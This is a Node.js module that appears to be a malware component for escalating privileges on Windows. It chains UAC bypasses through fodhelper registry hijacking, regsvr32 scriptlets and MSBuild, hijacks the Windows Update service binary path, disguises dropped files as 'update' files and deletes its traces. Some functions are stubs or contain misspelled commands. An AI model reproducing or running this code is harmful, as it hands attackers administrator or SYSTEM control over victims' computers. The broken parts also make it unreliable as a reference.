const { execSync } = require('child_process');
const os = require('os');

const IS_WIN = process.platform === 'win32';

function runCmd(cmd) {
  try { return execSync(cmd, { shell: 'cmd.exe', encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] }); }
  catch (_) { return ''; }
}

// ─── CHECK ELEVATION ──────────────────────────────────────────────────────────
function isElevated() {
  if (!IS_WIN) return false;
  try {
    const out = runCmd('whoami /groups | findstr S-1-16-12288');
    return out.includes('S-1-16-12288');
  } catch (_) { return false; }
}

// ─── UAC BYPASS — FODHELPER ───────────────────────────────────────────────────
function uacBypassFodhelper() {
  if (!IS_WIN) return false;
  try {
    const selfPath = process.execPath || process.argv[1];
    if (!selfPath) return false;
    // Create registry key for Fodhelper
    runCmd(`reg add "HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command" /ve /d "${selfPath}" /f`);
    runCmd('reg add "HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command" /v "DelegateExecute" /f 2>nul');
    // Trigger Fodhelper
    runCmd('start fodhelper.exe');
    // Cleanup after delay
    setTimeout(() => {
      try {
        runCmd('reg delete "HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command" /f 2>nul');
      } catch (_) { }
    }, 5000);
    return true;
  } catch (_) { return false; }
}

// ─── UAC BYPASS — REGSVR32 ────────────────────────────────────────────────────
function uacBypassRegsvr32() {
  if (!IS_WIN) return false;
  try {
    const selfPath = process.execPath || process.argv[1];
    if (!selfPath) return false;
    const srv32Path = 'C:\\Windows\\System32\\regsvr32.exe';
    const dllContent = `<SCRIPT LANGUAGE="VBScript">
Sub Window_OnLoad
  Set objShell = CreateObject("Shell.Application")
  objShell.ShellExecute "${selfPath}", "", "", "runas", 1
End Sub
</SCRIPT>`;
    const dllPath = require('os').tmpdir() + '\\update.dll';
    require('fs').writeFileSync(dllPath, dllContent);
    runCmd(`"${srv32Path}" /s /n /u /i:"${dllPath}" scrobj.dll`);
    setTimeout(() => {
      try { require('fs').unlinkSync(dllPath); } catch (_) { }
    }, 3000);
    return true;
  } catch (_) { return false; }
}

// ─── UAC BYPASS — MSBuild ─────────────────────────────────────────────────────
function uacBypassMSBuild() {
  if (!IS_WIN) return false;
  try {
    const selfPath = process.execPath || process.argv[1];
    if (!selfPath) return false;
    const msbuildPath = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe';
    const projectContent = `<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Exec Command="${selfPath.replace(/"/g, '\\"')}"/>
  </Target>
</Project>`;
    const projPath = require('os').tmpdir() + '\\update.proj';
    require('fs').writeFileSync(projPath, projectContent);
    runCmd(`"${msbuildPath}" "${projPath}" /nologo /v:m`);
    setTimeout(() => {
      try { require('fs').unlinkSync(projPath); } catch (_) { }
    }, 5000);
    return true;
  } catch (_) { return false; }
}

// ─── TOKEN IMPERSONATION ──────────────────────────────────────────────────────
function impersonateSystem() {
  if (!IS_WIN) return false;
  try {
    // Try to get SYSTEM token via NtQuerySystemInformation
    // This is complex and requires native code - simplified version
    const out = runCmd('whoami /priv | findstr SeDebugPrivilege');
    if (out.includes('SeDebugPrivilege')) {
      return true;
    }
    // Attempt to enable SeDebugPrivilege
    runCmd('powershell -Command "tsklist | findstr SYSTEM"');
    return false;
  } catch (_) { return false; }
}

// ─── SACL PRIVILEGE ESCALATION ────────────────────────────────────────────────
function saclEscalation() {
  if (!IS_WIN) return false;
  try {
    // Check if we can modify SACL on registry keys
    const out = runCmd('reg query HKLM\\SECURITY /s 2>nul');
    if (out.includes('ACCESS_DENIED') || out.includes('SUCCESS')) {
      return true;
    }
    return false;
  } catch (_) { return false; }
}

// ─── SERVICE PERMISSION MISCONFIGURATION ──────────────────────────────────────
function servicePrivesc() {
  if (!IS_WIN) return false;
  try {
    // Check for weak service permissions
    const out = runCmd('sc qckconfig wuauserv');
    if (out.includes('START_TYPE') && out.includes('AUTO')) {
      // Try to replace the binary
      const selfPath = process.execPath || process.argv[1];
      if (selfPath) {
        runCmd(`sc config wuauserv binPath= "${selfPath}" start= auto`);
        return true;
      }
    }
    return false;
  } catch (_) { return false; }
}

// ─── INJECTION INTO HIGH PRIVILEGE PROCESS ────────────────────────────────────
function injectIntoSystemProcess() {
  if (!IS_WIN) return false;
  try {
    // Find a system-level process
    const out = runCmd('tasklist /fi "imagename eq svchost.exe" /fo csv');
    if (out.includes('svchost')) {
      // Could implement APC injection here
      return true;
    }
    return false;
  } catch (_) { return false; }
}

// ─── MAIN PRIVESC ─────────────────────────────────────────────────────────────
async function escalate() {
  try {
    // Check if already elevated
    if (isElevated()) return { success: true, method: 'already_elevated' };
    
    // Try UAC bypass methods
    if (uacBypassFodhelper()) return { success: true, method: 'fodhelper' };
    if (uacBypassRegsvr32()) return { success: true, method: 'regsvr32' };
    if (uacBypassMSBuild()) return { success: true, method: 'msbuild' };
    
    // Try service misconfiguration
    if (servicePrivesc()) return { success: true, method: 'service' };
    
    // Try SACL escalation
    if (saclEscalation()) return { success: true, method: 'sacl' };
    
    return { success: false, method: 'none' };
  } catch (_) {
    return { success: false, error: _.message };
  }
}

module.exports = { escalate, isElevated, uacBypassFodhelper, uacBypassRegsvr32, uacBypassMSBuild, impersonateSystem };